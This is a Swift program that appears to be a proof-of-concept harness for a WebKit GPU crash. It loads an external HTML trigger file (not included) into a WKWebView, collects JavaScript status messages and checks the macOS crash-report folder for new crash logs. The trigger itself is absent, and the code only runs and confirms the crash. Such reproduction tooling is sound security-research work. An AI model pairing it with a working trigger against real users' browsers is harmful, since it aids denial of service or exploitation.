import Foundation
import WebKit
import AppKit

class Handler: NSObject, WKScriptMessageHandler {
    let done = DispatchSemaphore(value: 0)
    var msgs: [String] = []
    func userContentController(_ c: WKUserContentController, didReceive m: WKScriptMessage) {
        let s = m.body as? String ?? ""
        print("[JS] \(s)"); msgs.append(s)
        if s.hasPrefix("DONE") || s.hasPrefix("FAIL") { done.signal() }
    }
}

func diagLogs() -> Set<String> {
    let d = "\(NSHomeDirectory())/Library/Logs/DiagnosticReports"
    return Set((try? FileManager.default.contentsOfDirectory(atPath: d)) ?? [])
}

let pre = diagLogs()
print("[PoC] Pre-existing crash logs: \(pre.count)")

let htmlPath = CommandLine.arguments.count > 1 ? CommandLine.arguments[1] : "Sources/trigger.html"
guard let html = try? String(contentsOfFile: htmlPath, encoding: .utf8) else {
    print("[ERROR] Cannot read \(htmlPath)"); exit(1)
}

let cfg = WKWebViewConfiguration()
let uc = WKUserContentController()
let h = Handler()
uc.add(h, name: "status")
cfg.userContentController = uc

let app = NSApplication.shared
app.setActivationPolicy(.accessory)
let win = NSWindow(contentRect: .init(x: 0, y: 0, width: 200, height: 200),
                   styleMask: [.titled], backing: .buffered, defer: false)
let wv = WKWebView(frame: .init(x: 0, y: 0, width: 200, height: 200), configuration: cfg)
win.contentView = wv
win.orderFront(nil)
wv.loadHTMLString(html, baseURL: URL(string: "https://localhost"))
print("[PoC] Loaded, waiting 20s...")

_ = h.done.wait(timeout: .now() + .seconds(20))
print("[PoC] Messages: \(h.msgs)")
Thread.sleep(forTimeInterval: 3)

let post = diagLogs()
let new = post.subtracting(pre)
print("[PoC] New crash logs: \(new.count)")
let diagDir = "\(NSHomeDirectory())/Library/Logs/DiagnosticReports"
for f in new {
    print("[CRASH] \(f)")
    let content = (try? String(contentsOfFile: "\(diagDir)/\(f)", encoding: .utf8)) ?? ""
    print(content.components(separatedBy: "\n").prefix(60).joined(separator: "\n"))
}
if !new.isEmpty {
    print("[!] dfe0d84a7b CONFIRMED: GPU crash detected"); exit(0)
} else {
    print("[PoC] No crash log — path not reached or already patched"); exit(2)
}
